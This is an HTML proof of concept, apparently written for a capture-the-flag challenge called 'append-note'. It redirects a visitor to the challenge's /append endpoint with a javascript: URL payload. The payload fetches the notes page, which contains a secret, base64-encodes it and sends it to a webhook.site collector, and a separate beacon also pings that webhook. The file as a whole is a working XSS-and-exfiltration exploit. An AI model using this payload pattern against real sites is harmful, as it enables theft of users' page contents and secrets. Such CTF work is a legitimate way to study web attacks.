<!DOCTYPE html>
<html>
<head><title>XSS via redirect</title></head>
<body>
<div id="s">Loading...</div>
<script>
var TARGET = "https://append-note-hfskv.instancer.lac.tf";
var WEBHOOK = "https://webhook.site/70d9bf2c-e5cf-49dc-aeed-4203dbfd538d";

// Use backticks to avoid quote escaping by Jinja2
// The XSS payload fetches / which shows notes including SECRET
var payload = "javascript:fetch(`/`).then(r=>r.text()).then(t=>{new Image().src=`https://webhook.site/70d9bf2c-e5cf-49dc-aeed-4203dbfd538d?d=`+btoa(t)})";

navigator.sendBeacon(WEBHOOK, "XSS_V2");

document.getElementById('s').textContent = 'Redirecting...';

// Navigate to /append with javascript: URL redirect
window.location = TARGET + "/append?content=x&url=" + encodeURIComponent(payload);
</script>
</body>
</html>
